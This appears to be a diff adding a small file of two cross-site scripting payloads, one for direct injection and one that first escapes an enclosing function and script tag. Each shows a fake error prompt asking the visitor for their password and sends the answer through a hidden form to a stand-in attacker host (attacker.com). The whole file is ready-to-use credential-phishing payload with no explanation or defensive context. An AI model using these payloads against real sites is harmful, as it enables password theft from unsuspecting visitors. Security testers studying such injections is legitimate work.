@@ -1,0 +1,11 @@
+STRAIGHT INJECTION
+
+<script>var pass=prompt("Oops! Something went wrong! Please Enter Password to continue...");</script><form id="frm1" action="http://attacker.com/password.php" method="GET"><input type="hidden" name="password" id="passform" /></form><script>if(pass!=null) { document.getElementById("passform").value=pass;document.getElementById("frm1").submit();}</script>
+
+
+ESCAPE A FUNCTION
+
+}</script><script>var pass=prompt("Oops! Something went wrong! Please Enter Password to continue...");</script><form id="frm1" action="http://attacker.com/password.php" method="GET"><input type="hidden" name="password" id="passform" /></form><script>if(pass!=null) { document.getElementById("passform").value=pass;document.getElementById("frm1").submit();}</script>
+
+
+
